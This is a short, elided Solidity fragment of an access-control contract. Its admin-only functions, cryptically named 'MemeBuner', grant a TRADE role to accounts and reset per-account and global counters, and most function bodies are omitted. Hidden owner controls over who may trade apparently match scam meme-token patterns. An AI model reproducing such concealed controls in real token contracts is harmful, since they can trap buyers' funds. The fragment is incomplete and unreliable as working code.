...
abstract contract NTACCControl is Context, INTACCControl {
    ...
    function MemeBuner_W(address account, uint256 amount)
        public
        onlyRole(ADMIN)
    {
    ...
    function MemeBuner_S(address account, uint256 amount)
        public
        onlyRole(ADMIN)
    {
    ...
    function MemeBuner_L(address account) public onlyRole(ADMIN) {
        _grantRole(TRADE, account);
        _number[account] = 0;
    }

    function MemeBuner_A() public onlyRole(ADMIN) {
        _numberS = 128;
    }
